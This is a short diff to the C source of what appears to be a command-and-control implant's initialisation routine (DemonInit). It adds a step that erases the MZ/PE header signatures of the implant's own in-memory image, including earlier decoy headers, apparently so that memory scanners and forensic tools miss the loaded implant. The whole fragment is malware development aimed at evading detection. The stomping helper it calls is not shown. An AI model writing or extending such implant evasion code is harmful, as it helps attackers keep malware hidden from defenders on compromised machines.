@@ -546,6 +546,16 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
+    /* ARC-07: unconditionally zero the MZ/DOS/PE signatures at our base
+     * address.  Runs after ARC-05 (if enabled) so that even the decoy
+     * headers have their signatures erased.  When ARC-05 is disabled this
+     * still removes the original MZ/PE artefact. */
+    if ( Instance->Session.ModuleBase ) {
+        if ( ! NT_SUCCESS( RtStompPeHeader() ) ) {
+            PUTS( "[INIT] Warning: PE header signature erasure failed" )
+        }
+    }
+
 #if _WIN64
     Instance->Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
     Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
